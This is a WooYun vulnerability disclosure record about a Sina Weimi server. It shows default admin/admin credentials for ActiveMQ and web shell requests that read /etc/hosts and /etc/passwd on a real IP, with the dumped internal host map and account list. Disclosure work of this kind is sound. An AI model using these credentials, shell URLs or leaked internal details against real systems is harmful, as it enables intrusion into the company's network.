{"id": 88389, "wybug_id": "wooyun-2016-0224381", "wybug_title": "新浪微米某系统弱口令getshell/root权限/内网环境                                      ", "wybug_corp": "新浪", "wybug_author": "路人甲", "wybug_date": "2016-06-29 13:58", "wybug_open_date": "2016-07-04 10:30", "wybug_type": "命令执行", "wybug_level": "高", "wybug_rank_0": "12", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["远程命令执行"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-06-29：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-07-04：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： rt 详细说明：  看到都提给sina了 于是我也跟着众神们的节奏来一发\n\nhttp://183.136.160.234:8161/ActionMQ 弱口令 admin admin\n\nhttp://183.136.160.234:8161/admin/test/sex.jsphttp://183.136.160.234:8161/admin/test/sex.jsp?pwd=023&cmd=cat%20/etc/hosts应该是直入内网了。。\n# that require network functionality will fail.127.0.0.1\t\tlocalhost.localdomain localhost::1\t\tlocalhost6.localdomain6 localhost6202.106.184.152 interface.blog.sina.com.cn10.0.8.32 datacube_mongo#shequ10.221.149.246  shequ.dev.weimi.me#hdfs#10.0.8.123   wemeetcluster10.0.8.103 storage.intra.ilianmeng.com10.0.8.103 test2.live.intra.ilianmeng.com10.0.8.32 matrix_registry_110.0.8.32 matrix_registry_210.0.8.32 matrix_registry_3  mongodb_server10.0.8.32 matrixmc_1   matrixuuid_110.0.8.32 matrixmc_2   matrixuuid_210.0.8.32 matrixmc_3   matrixuuid_310.0.8.32 matrixmc_4   matrixuuid_410.0.8.32 matrixdb m_api_db.intra.ilianmeng.com 10.0.8.32 s_api_db.intra.ilianmeng.com 10.0.8.32 matrixredis_110.0.8.32 matrixredis_210.0.8.32 matrixredis_310.0.8.32 matrixredis_410.0.8.103 sentinel_host_110.0.8.103 sentinel_host_210.0.8.32  sentinel_host_310.0.8.32 pushserver push.intra.ilianmeng.com10.0.8.10\t\tnode10.intra.hiwemeet.com 10.0.8.32\tnode11.intra.hiwemeet.com10.0.8.103\tnode103.intra.ilianmeng.com\timg.intra.ilianmeng.com  amq.intra.ilianmeng.com searchService neo4j_server search.intra.ilianmeng.com test2.api.intra.ilianmeng.com test2.img.ilianmeng.com  test2.img.intra.ilianmeng.com 10.0.8.13\t\tnode13.intra.hiwemeet.com10.0.8.14\t\tnode14.intra.hiwemeet.com10.0.8.2        \tnode2.intra.hiwemeet.com10.0.8.3\t\tnode3.intra.hiwemeet.com10.0.8.4\t\tnode4.intra.hiwemeet.com10.0.8.5\t\tnode5.intra.hiwemeet.com10.0.8.6\t\tnode6.intra.hiwemeet.com10.0.8.7\t\tnode7.intra.hiwemeet.com10.0.8.8\t\tnode8.intra.hiwemeet.com10.0.8.9\t\tnode9.intra.hiwemeet.com10.0.8.15\t\tsalt\tyum.intra.hiwemeet.com\tnode15.intra.hiwemeet.com statsdserver repo.hiwemeet.com10.0.8.43\t\tnode43.intra.hiwemeet.com baokumc_1 baokumc_2 baokumc_3 baokumc_4 s_api_db.intra.baoku.com m_api_db.intra.baoku.com10.0.8.44\t\tnode44.intra.hiwemeet.com10.0.8.45\t\tnode45.intra.hiwemeet.com10.0.8.102      node102.intra.hiwemeet.com sub.intra.hiwemeet.com10.0.8.103      node103.intra.hiwemeet.com sub.intra.ilianmeng.com 10.0.8.102      couchbase115 couchbase11610.0.8.103      couchbase117 couchbase11810.0.8.6             redis1.shihui.com10.0.8.32             s_shihui_db.intra.ilianmeng.com    s_shihui_db.intra.hiwemeet.com10.0.8.32\t\tm_shihui_db.intra.ilianmeng.com \tm_shihui_db.intra.hiwemeet.com10.0.8.235              redis2.shihui.com10.0.8.235             redis3.shihui.com10.0.8.235               shihuiredis_110.0.8.235               shihuiredis_210.0.8.235               shihuiredis_310.0.8.235               shihuiredis_410.0.8.32               shihuimc_110.0.8.32               shihuimc_210.0.8.32               shihuimc_310.0.8.32               shihuimc_410.0.8.103      test2.img.intra.ilianmeng.com    10.0.8.103      test2.scorpio.ilianmeng.com10.0.8.107 \tstatic.17shihui.cn10.0.8.103      api.ilianmeng.com10.0.8.103      dev.scorpio.ilianmeng.com10.0.8.32 \ttest2.search.user.db.host search.user.db.host10.0.8.43 51baokuredis_110.0.8.43 51baokuredis_210.0.8.43 51baoku_uuid_110.0.8.43 51baoku_uuid_210.0.8.43 m_db.intra.51baoku.com10.0.8.43 s_db.intra.51baoku.com\n\n\n\n\nhttp://183.136.160.234:8161/admin/test/sex.jsp?pwd=023&cmd=cat%20/etc/passwd\nroot:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownhalt:x:7:0:halt:/sbin:/sbin/haltmail:x:8:12:mail:/var/spool/mail:/sbin/nologinuucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologinoperator:x:11:0:operator:/root:/sbin/nologingames:x:12:100:games:/usr/games:/sbin/nologingopher:x:13:30:gopher:/var/gopher:/sbin/nologinftp:x:14:50:FTP User:/var/ftp:/sbin/nologinnobody:x:99:99:Nobody:/:/sbin/nologindbus:x:81:81:System message bus:/:/sbin/nologinhacluster:x:499:499:cluster user:/home/hacluster:/sbin/nologinnamed:x:25:25:Named:/var/named:/sbin/nologinrpc:x:32:32:Rpcbind Daemon:/var/cache/rpcbind:/sbin/nologinoprofile:x:16:16:Special user account to be used by OProfile:/home/oprofile:/sbin/nologinusbmuxd:x:113:113:usbmuxd user:/:/sbin/nologinpegasus:x:66:65:tog-pegasus OpenPegasus WBEM/CIM services:/var/lib/Pegasus:/sbin/nologincimsrvr:x:134:134:tog-pegasus OpenPegasus WBEM/CIM services:/var/lib/Pegasus:/sbin/nologinabrt:x:173:173::/etc/abrt:/sbin/nologinvcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologinrtkit:x:498:495:RealtimeKit:/proc:/sbin/nologinavahi-autoipd:x:170:170:Avahi IPv4LL Stack:/var/lib/avahi-autoipd:/sbin/nologinapache:x:48:48:Apache:/var/www:/sbin/nologinsaslauth:x:497:76:\"Saslauthd user\":/var/empty/saslauth:/sbin/nologinpostfix:x:89:89::/var/spool/postfix:/sbin/nologintss:x:59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologinrpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologinnfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologinhaldaemon:x:68:68:HAL daemon:/:/sbin/nologingdm:x:42:42::/var/lib/gdm:/sbin/nologinricci:x:140:140:ricci daemon user:/var/lib/ricci:/sbin/nologintomcat:x:91:91:Apache Tomcat:/usr/share/tomcat6:/sbin/nologinntp:x:38:38::/etc/ntp:/sbin/nologindhcpd:x:177:177:DHCP server:/:/sbin/nologinmemcached:x:496:493:Memcached daemon:/var/run/memcached:/sbin/nologinmysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/bashpulse:x:495:492:PulseAudio System Daemon:/var/run/pulse:/sbin/nologinstap-server:x:155:155:Systemtap Compile Server:/var/lib/stap-server:/sbin/nologinxguest:x:500:500:Guest:/home/xguest:/sbin/nologinsabayon:x:86:86:Sabayon user:/home/sabayon:/sbin/nologinsshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologinquagga:x:92:92:Quagga routing suite:/var/run/quagga:/sbin/nologinwebalizer:x:67:67:Webalizer:/var/www/usage:/sbin/nologinarpwatch:x:77:77::/var/lib/arpwatch:/sbin/nologinluci:x:141:141:luci high availability management application:/var/lib/luci:/sbin/nologinident:x:98:98::/:/sbin/nologinuuidd:x:494:488:UUID generator helper daemon:/var/lib/libuuid:/sbin/nologinradvd:x:75:75:radvd user:/:/sbin/nologinsquid:x:23:23::/var/spool/squid:/sbin/nologintcpdump:x:72:72::/:/sbin/nologinradiusd:x:95:95:radiusd user:/home/radiusd:/sbin/nologinyuanming:x:501:501::/home/yuanming:/bin/bashhaibo:x:502:502::/home/haibo:/bin/bashgaozhi:x:503:503::/home/gaozhi:/bin/bashhanjian:x:504:504::/home/hanjian:/bin/bashliuxin:x:505:505::/home/liuxin:/bin/bashyiqian:x:506:506::/home/yiqian:/bin/bashyifeng:x:507:507::/home/yifeng:/bin/bashwww:x:508:508::/home/www:/bin/bashcouchbase:x:493:486:couchbase system user:/opt/couchbase:/bin/shnginx:x:492:485:Nginx web server:/var/lib/nginx:/sbin/nologintd-agent:x:491:484:td-agent:/var/lib/td-agent:/sbin/nologinyongrong:x:509:509::/home/yongrong:/bin/bashbaoku:x:510:10::/home/baoku:/bin/bashyuwenlong:x:511:511::/home/yuwenlong:/bin/bashjizheng:x:512:10::/home/jizheng:/bin/bashzhangjianghao:x:513:513::/home/zhangjianghao:/bin/bash\n就证明这么多。   漏洞证明：  root:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownhalt:x:7:0:halt:/sbin:/sbin/haltmail:x:8:12:mail:/var/spool/mail:/sbin/nologinuucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologinoperator:x:11:0:operator:/root:/sbin/nologingames:x:12:100:games:/usr/games:/sbin/nologingopher:x:13:30:gopher:/var/gopher:/sbin/nologinftp:x:14:50:FTP User:/var/ftp:/sbin/nologinnobody:x:99:99:Nobody:/:/sbin/nologindbus:x:81:81:System message bus:/:/sbin/nologinhacluster:x:499:499:cluster user:/home/hacluster:/sbin/nologinnamed:x:25:25:Named:/var/named:/sbin/nologinrpc:x:32:32:Rpcbind Daemon:/var/cache/rpcbind:/sbin/nologinoprofile:x:16:16:Special user account to be used by OProfile:/home/oprofile:/sbin/nologinusbmuxd:x:113:113:usbmuxd user:/:/sbin/nologinpegasus:x:66:65:tog-pegasus OpenPegasus WBEM/CIM services:/var/lib/Pegasus:/sbin/nologincimsrvr:x:134:134:tog-pegasus OpenPegasus WBEM/CIM services:/var/lib/Pegasus:/sbin/nologinabrt:x:173:173::/etc/abrt:/sbin/nologinvcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologinrtkit:x:498:495:RealtimeKit:/proc:/sbin/nologinavahi-autoipd:x:170:170:Avahi IPv4LL Stack:/var/lib/avahi-autoipd:/sbin/nologinapache:x:48:48:Apache:/var/www:/sbin/nologinsaslauth:x:497:76:\"Saslauthd user\":/var/empty/saslauth:/sbin/nologinpostfix:x:89:89::/var/spool/postfix:/sbin/nologintss:x:59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologinrpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologinnfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologinhaldaemon:x:68:68:HAL daemon:/:/sbin/nologingdm:x:42:42::/var/lib/gdm:/sbin/nologinricci:x:140:140:ricci daemon user:/var/lib/ricci:/sbin/nologintomcat:x:91:91:Apache Tomcat:/usr/share/tomcat6:/sbin/nologinntp:x:38:38::/etc/ntp:/sbin/nologindhcpd:x:177:177:DHCP server:/:/sbin/nologinmemcached:x:496:493:Memcached daemon:/var/run/memcached:/sbin/nologinmysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/bashpulse:x:495:492:PulseAudio System Daemon:/var/run/pulse:/sbin/nologinstap-server:x:155:155:Systemtap Compile Server:/var/lib/stap-server:/sbin/nologinxguest:x:500:500:Guest:/home/xguest:/sbin/nologinsabayon:x:86:86:Sabayon user:/home/sabayon:/sbin/nologinsshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologinquagga:x:92:92:Quagga routing suite:/var/run/quagga:/sbin/nologinwebalizer:x:67:67:Webalizer:/var/www/usage:/sbin/nologinarpwatch:x:77:77::/var/lib/arpwatch:/sbin/nologinluci:x:141:141:luci high availability management application:/var/lib/luci:/sbin/nologinident:x:98:98::/:/sbin/nologinuuidd:x:494:488:UUID generator helper daemon:/var/lib/libuuid:/sbin/nologinradvd:x:75:75:radvd user:/:/sbin/nologinsquid:x:23:23::/var/spool/squid:/sbin/nologintcpdump:x:72:72::/:/sbin/nologinradiusd:x:95:95:radiusd user:/home/radiusd:/sbin/nologinyuanming:x:501:501::/home/yuanming:/bin/bashhaibo:x:502:502::/home/haibo:/bin/bashgaozhi:x:503:503::/home/gaozhi:/bin/bashhanjian:x:504:504::/home/hanjian:/bin/bashliuxin:x:505:505::/home/liuxin:/bin/bashyiqian:x:506:506::/home/yiqian:/bin/bashyifeng:x:507:507::/home/yifeng:/bin/bashwww:x:508:508::/home/www:/bin/bashcouchbase:x:493:486:couchbase system user:/opt/couchbase:/bin/shnginx:x:492:485:Nginx web server:/var/lib/nginx:/sbin/nologintd-agent:x:491:484:td-agent:/var/lib/td-agent:/sbin/nologinyongrong:x:509:509::/home/yongrong:/bin/bashbaoku:x:510:10::/home/baoku:/bin/bashyuwenlong:x:511:511::/home/yuwenlong:/bin/bashjizheng:x:512:10::/home/jizheng:/bin/bashzhangjianghao:x:513:513::/home/zhangjianghao:/bin/bash   修复方案：  弱口令   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2016-07-04 10:30 厂商回复： 请直接提交给微米官方联系修复。 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-06-30 15:16 |    \t\t洋葱(乌云厂商)\t\t \n  弱口令……洋葱占个坑    \n     2016-06-30 15:27 |    \t\tj14n \t\t\t( 普通白帽子  |\t\t\t        Rank:2345 漏洞数:421        )\t\t \n  @洋葱 吃掉你    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}